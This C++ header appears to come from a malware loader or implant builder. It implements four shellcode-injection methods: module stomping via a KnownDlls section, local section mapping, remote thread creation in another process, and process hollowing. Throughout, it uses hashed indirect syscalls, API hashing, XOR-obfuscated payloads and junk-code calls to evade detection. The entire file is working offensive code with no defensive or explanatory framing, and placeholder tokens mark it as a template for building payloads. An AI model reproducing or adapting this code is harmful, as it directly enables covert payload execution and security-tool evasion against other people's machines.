#pragma once
#include "syscalls.hpp"
#include "evasion.hpp"

struct InjCtx {
    unsigned char* payload;
    int len;
    const unsigned char* xor_key;
    int key_len;
};

static bool _module_stomp(InjCtx* ctx,const char* dll_name){
    void* target=_getmod(_hash(dll_name));
    if(!target)return false;
    HANDLE hs=0;
    wchar_t dll_full[96];int di=0;
    unsigned char _pre[]=__KNOWN_DLLS_PREFIX_BYTES__;
    wchar_t prefix[__KNOWN_DLLS_PREFIX_BUF__];
    for(int i=0;i<__KNOWN_DLLS_PREFIX_LEN__;i++)prefix[i]=_pre[i]^__OBF_KEY__;
    prefix[__KNOWN_DLLS_PREFIX_LEN__]=0;
    for(int i=0;prefix[i];i++)dll_full[di++]=prefix[i];
    for(int i=0;dll_name[i]&&i<63;i++)dll_full[di++]=dll_name[i];
    dll_full[di]=0;
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    typedef void (NTAPI*pRIUS)(PUNICODE_STRING,PCWSTR);
    pRIUS _rius=(pRIUS)_getapi(nt,_hash("RtlInitUnicodeString"));
    if(!_rius)return false;
    UNICODE_STRING us;
    _rius(&us,dll_full);
    OBJECT_ATTRIBUTES oa;InitializeObjectAttributes(&oa,&us,OBJ_CASE_INSENSITIVE,0,0);
    typedef NTSTATUS(NTAPI*pNOS)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES);
    pNOS nos=(pNOS)_getapi(nt,_hash("NtOpenSection"));
    if(!nos||nos(&hs,SECTION_MAP_READ|SECTION_MAP_WRITE|SECTION_MAP_EXECUTE,&oa)!=0||!hs)return false;
    PVOID vw=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&vw,0)!=0||!vw){
        CloseHandle(hs);return false;
    }
    PIMAGE_DOS_HEADER d2=(PIMAGE_DOS_HEADER)vw;
    PIMAGE_NT_HEADERS n2=(PIMAGE_NT_HEADERS)((BYTE*)vw+d2->e_lfanew);
    PIMAGE_SECTION_HEADER s2=IMAGE_FIRST_SECTION(n2);
    bool ok=false;
    for(WORD i=0;i<n2->FileHeader.NumberOfSections;i++){
        if(s2[i].Characteristics&IMAGE_SCN_MEM_EXECUTE){
            DWORD cpy=(ctx->len<(int)s2[i].SizeOfRawData)?ctx->len:(int)s2[i].SizeOfRawData;
            SIZE_T off=s2[i].VirtualAddress;
            SIZE_T sz2=s2[i].SizeOfRawData;
            ULONG old=0;
            _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&off,(uintptr_t)&sz2,(uintptr_t)__PERM_DATA__,(uintptr_t)&old);
            SIZE_T off2=s2[i].VirtualAddress;
            _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
            memcpy((BYTE*)vw+off2,ctx->payload,cpy);
            _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
            old=0;
            _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&off2,(uintptr_t)&sz2,(uintptr_t)__PERM_EXEC__,(uintptr_t)&old);
            ((void(*)())((BYTE*)vw+s2[i].VirtualAddress))();
            ok=true;break;
        }
    }
    CloseHandle(hs);
    return ok;
}

static bool _section_mapping(InjCtx* ctx){
    HANDLE hs=0;LARGE_INTEGER sz;sz.QuadPart=ctx->len;
    if(_call(0x98ad6a23,(uintptr_t)&hs,SECTION_ALL_ACCESS,0,(uintptr_t)&sz)!=0||!hs)return false;
    PVOID lv=0;SIZE_T vs=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&lv,0)!=0||!lv){
        CloseHandle(hs);return false;
    }
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    memcpy(lv,ctx->payload,ctx->len);
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    PVOID ev=0;vs=0;
    if(_call(0x904a0c6d,(uintptr_t)hs,(uintptr_t)GetCurrentProcess(),(uintptr_t)&ev,0)!=0||!ev){
        _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)lv);
        CloseHandle(hs);return false;
    }
    ULONG old=0;
    _call(0x1f76d494,(uintptr_t)GetCurrentProcess(),(uintptr_t)&ev,(uintptr_t)&vs,(uintptr_t)__PERM_EXEC__,(uintptr_t)&old);
    ((void(*)())ev)();
    _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)ev);
    _call(0x38612ca4,(uintptr_t)GetCurrentProcess(),(uintptr_t)lv);
    CloseHandle(hs);
    return true;
}

static bool _thread_hijack(InjCtx* ctx,DWORD pid){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    HANDLE ph=0;
    OBJECT_ATTRIBUTES oa;InitializeObjectAttributes(&oa,0,0,0,0);
    CLIENT_ID cid;cid.UniqueProcess=(HANDLE)(ULONG_PTR)pid;cid.UniqueThread=0;
    typedef NTSTATUS(NTAPI*pNOP)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PCLIENT_ID);
    pNOP nop=(pNOP)_getapi(nt,_hash("NtOpenProcess"));
    if(!nop||nop(&ph,PROCESS_ALL_ACCESS,&oa,&cid)!=0)return false;
    PVOID buf=0;SIZE_T sz=ctx->len;
    if(_call(0x3ad74d22,(uintptr_t)ph,(uintptr_t)&buf,0,(uintptr_t)&sz,(uintptr_t)(MEM_COMMIT|MEM_RESERVE),(uintptr_t)__PERM_ALLOC__)!=0){
        CloseHandle(ph);return false;
    }
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    _call(0x7e3c0d8c,(uintptr_t)ph,(uintptr_t)buf,(uintptr_t)ctx->payload,(uintptr_t)ctx->len,0);
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    typedef NTSTATUS(NTAPI*pNCTE)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,PVOID,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
    pNCTE ncte=(pNCTE)_getapi(nt,_hash("NtCreateThreadEx"));
    if(ncte){
        HANDLE th2=0;
        ncte(&th2,THREAD_ALL_ACCESS,0,ph,buf,buf,0,0,0,0,0);
        if(th2){
            WaitForSingleObject(th2,INFINITE);
            CloseHandle(th2);
        }
    }
    CloseHandle(ph);
    return true;
}

static bool _proc_hollow(InjCtx* ctx){
    void* nt=_getmod(_hash("ntdll.dll"));
    if(!nt)return false;
    STARTUPINFOW si={sizeof(si)};PROCESS_INFORMATION pi;
    if(!CreateProcessW(__HOLLOW_PATH__,0,0,0,0,
        CREATE_SUSPENDED,0,0,&si,&pi))return false;
    PROCESS_BASIC_INFORMATION pbi;
    typedef NTSTATUS(NTAPI*pNQIP)(HANDLE,ULONG,PVOID,ULONG,PULONG);
    pNQIP nqip=(pNQIP)_getapi(nt,_hash("NtQueryInformationProcess"));
    if(!nqip||nqip(pi.hProcess,0,&pbi,sizeof(pbi),0)!=0){
        TerminateProcess(pi.hProcess,0);return false;
    }
    PVOID image_base=0;
    SIZE_T bytes_read=0;
    ReadProcessMemory(pi.hProcess,(PVOID)((BYTE*)pbi.PebBaseAddress+16),&image_base,sizeof(PVOID),&bytes_read);
    if(!image_base){
        TerminateProcess(pi.hProcess,0);return false;
    }
    _call(0x38612ca4,(uintptr_t)pi.hProcess,(uintptr_t)image_base);
    LPVOID remote=malloc(ctx->len);
    if(!remote){TerminateProcess(pi.hProcess,0);return false;}
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    memcpy(remote,ctx->payload,ctx->len);
    _xorf(ctx->payload,ctx->len,ctx->xor_key,ctx->key_len);
    PVOID alloc=0;SIZE_T asz=ctx->len;
    if(_call(0x3ad74d22,(uintptr_t)pi.hProcess,(uintptr_t)&alloc,(uintptr_t)image_base,(uintptr_t)&asz,
        (uintptr_t)(MEM_COMMIT|MEM_RESERVE),(uintptr_t)__PERM_ALLOC__)!=0){
        _call(0x3ad74d22,(uintptr_t)pi.hProcess,(uintptr_t)&alloc,0,(uintptr_t)&asz,
            (uintptr_t)(MEM_COMMIT|MEM_RESERVE),(uintptr_t)__PERM_ALLOC__);
    }
    if(!alloc){free(remote);TerminateProcess(pi.hProcess,0);return false;}
    _call(0x7e3c0d8c,(uintptr_t)pi.hProcess,(uintptr_t)alloc,(uintptr_t)ctx->payload,(uintptr_t)ctx->len,0);
    CONTEXT ctx2;memset(&ctx2,0,sizeof(ctx2));
    ctx2.ContextFlags=CONTEXT_FULL;
    GetThreadContext(pi.hThread,&ctx2);
#ifdef _WIN64
    ctx2.Rcx=(DWORD64)alloc;
#else
    ctx2.Eax=(DWORD)alloc;
#endif
    SetThreadContext(pi.hThread,&ctx2);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

#define H_INJ_MODULE 0x530d63db
#define H_INJ_SECTION 0x11153fa5
#define H_INJ_THREAD 0x75026ca4
#define H_INJ_HOLLOW 0xd31ea1b6
static bool Inject(InjCtx* ctx,const char* method,const char* target_dll,DWORD target_pid){
    _junk();
    DWORD mh=_hash(method);
    if(mh==H_INJ_MODULE){
        if(_module_stomp(ctx,target_dll))return true;
        return _section_mapping(ctx);
    }else if(mh==H_INJ_SECTION){
        return _section_mapping(ctx);
    }else if(mh==H_INJ_THREAD){
        return _thread_hijack(ctx,target_pid);
    }else if(mh==H_INJ_HOLLOW){
        return _proc_hollow(ctx);
    }
    return _section_mapping(ctx);
}
